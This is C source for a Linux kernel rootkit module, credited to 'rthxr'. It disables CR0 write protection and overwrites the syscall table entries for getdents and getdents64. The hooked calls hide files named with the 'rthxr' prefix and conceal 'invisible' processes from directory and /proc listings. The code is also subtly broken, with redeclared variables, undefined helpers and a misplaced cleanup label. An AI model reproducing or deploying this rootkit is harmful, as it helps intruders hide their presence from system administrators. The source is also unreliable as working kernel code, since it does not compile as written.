/*
 * Author: Arthur (rthxr)
 * In collaboration w/ Rodrigo Teofilo 
 *
 * 15/02/2024
 * Terminated on 26/02/2024
 */


//---------------------------------------------------+
#include<linux/kernel.h>//                           |
#include<linux/module.h>//         libraries         |
#include "lib/ftrace_helper.h"//                     |
//---------------------------------------------------+
#define RTHXR "rthxr"//            MACROS            |
//---------------------------------------------------+
//                                                      Global Data
//----------------------------------------------------------------------+
unsigned long *__sysc_table;//                                          |
typedef asmlinkage (*t_syscall)(const struct pt_regs *);//              |
//                                                                      |
static t_syscall orig_getdents;//                                       |                      
static t_syscall orig_getdents64;//                                     |
//----------------------------------------------------------------------+
//                                                                            GETDENTS64 CORRUPTION
//-------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);//                                           |
asmlinkage int rthxr_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//     |
{//                                                                                                            |
	int fd = (int)pt_regs->di;//                                                                           |
	struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                    |
//                                                                                                             |
	int ret = orig_getdents64(pt_regs), err;//                                                             |
//                                                                                                             |
	unsigned short proc = 0;//                                                                             |
	unsigned long off = 0;//                                                                               |
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;//                                                  |
	struct inode *d_inode;//                                                                               |
//                                                                                                             |
	if (ret <= 0)//                                                                                        |
		return ret;//                                                                                  |
//                                                                                                             |		
	kdirent = kzalloc(ret, GFP_KERNEL);//                                                                  |
	if(kdirent == NULL)//                                                                                  |
		return ret;//                                                                                  |
//                                                                                                             |
	err = copy_from_user(kdirent, dirent, ret);//                                                          |
	if (err)//                                                                                             |
		goto out;//                                                                                    |
//                                                                                                             |
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                       |
//                                                                                                             |
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                       |
		proc = 1;//                                                                                    |
//                                                                                                             |
	while (off < ret)//                                                                                    |
	{//                                                                                                    |
		dir = (void *)kdirent + off;//                                                                 |
		if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                  |
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                      |
			if(dir == kdirent)//                                                                   |
			{//                                                                                    |
				ret -= dir->d_reclen;//                                                        |
				memmove(dir, (void *)dir + dir->d_reclen, ret);//                              |
				continue;//                                                                    |
			}//                                                                                    |
			prev->d_reclen += dir->d_reclen;//                                                     |
		} else {//                                                                                     |
			prev = dir;//                                                                          |
			off += dir->d_reclen;//                                                                |
		}//                                                                                            |
		err = copy_to_user(dirent, kdirent, ret);//                                                    |
		if (err)//                                                                                     |
			goto out;//                                                                            |
//                                                                                                             |
		out://                                                                                         |
			kfree(kdirent);//                                                                      |
			return ret;//                                                                          |
	}//                                                                                                    |
//                                                                                                             |
}//------------------------------------------------------------------------------------------------------------+

//                                                                              GETDENTS CORRUPTION
//-------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*rthxr_getdents)(const struct pt_regs *);//                                            |
asmlinkage int rthxr_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//       |
{//                                                                                                            |
	int fd = (int)pt_regs->di;//                                                                           |
	struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                    |
//                                                                                                             |
	int ret = orig_getdents(pt_regs), err;//                                                               |
//                                                                                                             |
	unsigned short proc = 0;//                                                                             |
	unsigned long off = 0;//                                                                               |
	struct linux_dirent *dir, *kdirent, *prev = NULL;//                                                    |
	struct inode *d_inode;//                                                                               |
//                                                                                                             |
	if (ret <= 0)//                                                                                        |
		return ret;//                                                                                  |
//                                                                                                             |		
	kdirent = kzalloc(ret, GFP_KERNEL);//                                                                  |
	if(kdirent == NULL)//                                                                                  |
		return ret;//                                                                                  |
//                                                                                                             |
	err = copy_from_user(kdirent, dirent, ret);//                                                          |
	if (err)//                                                                                             |
		goto out;//                                                                                    |
//                                                                                                             |
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                       |
//                                                                                                             |
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                       |
		proc = 1;//                                                                                    |
//                                                                                                             |
	while (off < ret)//                                                                                    |
	{//                                                                                                    |
		dir = (void *)kdirent + off;//                                                                 |
		if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                  |
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                      |
			if(dir == kdirent)//                                                                   |
			{//                                                                                    |
				ret -= dir->d_reclen;//                                                        |
				memmove(dir, (void *)dir + dir->d_reclen, ret);//                              |
				continue;//                                                                    |
			}//                                                                                    |
			prev->d_reclen += dir->d_reclen;//                                                     |
		} else {//                                                                                     |
			prev = dir;//                                                                          |
			off += dir->d_reclen;//                                                                |
		}//                                                                                            |
		err = copy_to_user(dirent, kdirent, ret);//                                                    |
		if (err)//                                                                                     |
			goto out;//                                                                            |
//                                                                                                             |
		out://                                                                                         |
			kfree(kdirent);//                                                                      |
			return ret;//                                                                          |
	}//                                                                                                    |
//                                                                                                             |
}//------------------------------------------------------------------------------------------------------------+

//                                                       CR0 REGISTER CORRUPTION
//-------------------------------------------------------------------------------+
unsigned long cr0;//                                                             |
static inline void _cr0(unsigned long value)//                                   |
{//                                                                              |
  unsigned long __force_order;//                                                 |
  asm volatile("mov %0, %%cr0"://                                                |
				"+r"(value),//                                   |
				"+m"(__force_order));//                          |
}//------------------------------------------------------------------------------+
//                                               RETURNING SYSCALL TABLE ADDRESS
//-------------------------------------------------------------------------------+
unsigned long *__ret_sysc_table(void)//                                          |
{//                                                                              |
	__sysc_tb = (unsigned long *)kallsyms_lookup_name("sys_call_table");//   |
	return __sysc_tb;//                                                      |
}//------------------------------------------------------------------------------+
//                                                                             LOADING AND UNLOADING THE DIRENT HOOKING
//--------------------------------------------------------------------------------------------------------------+
static int __init lkmtodirenthooking_init(void)//                                                               | loading function
{//                                                                                                             |
	cr0 = read_cr0();//                                                                                     | reading cr0 register value
	unsigned long *__syscall_table = __ret_sysc_table();//                                                  | return syscall table address
	_cr0(cr0 & ~0x00010000);//                                                                              | defeating memory protection
//                                                                                                              |
    orig_getdents = (t_syscall)__syscall_table[__NR_getdents];//                                                | saving current getdents
    orig_getdents64 = (t_syscall)__syscall_table[__NR_getdents64];//                                            | saving current getdents64
//                                                                                                              |
    __syscall_table[__NR_getdents] = (unsigned long)rthxr_getdents;//                                           | corrupting syscall table
    __syscall_table[__NR_getdents64] = (unsigned long)rthxr_getdents64;//                                       | corrupting syscall table
//                                                                                                              |
	_cr0(__cr0);//                                                                                          | protecting memory
	return 0;//                                                                                             | ($w$) 
}//                                                                                                             |
//--------------------------------------------------------------------------------------------------------------+
static void __exit lkmtodirenthooking_exit(void)//                                                              | unloading function
{//                                                                                                             |
	cr0 = read_cr0();//                                                                                     | reading cr0 register value
	unsigned long *__syscall_table = __ret_sysc_table();//                                                  | return syscall table address
//                                                                                                              |
	__cr0(cr0 & ~0x00010000);//                                                                             | defeating memory protection
//                                                                                                              | 
	__syscall_table[__NR_getdents] = (unsigned long)orig_getdents;//                                        | restoring getdents
	__syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;//                                    | restoring getdents64
//                                                                                                              |
	__cr0(cr0);//                                                                                           | protecting memory
	return NULL;//                                                                                          | ~(88)^>
}//                                                                                                             |
//--------------------------------------------------------------------------------------------------------------+
module_init(lkmtodirenthooking_init);//                                                                         | Driver Initialization
module_exit(lkmtodirenthooking_exit);//                                                                         | Driver Destruction
//--------------------------------------------------------------------------------------------------------------+
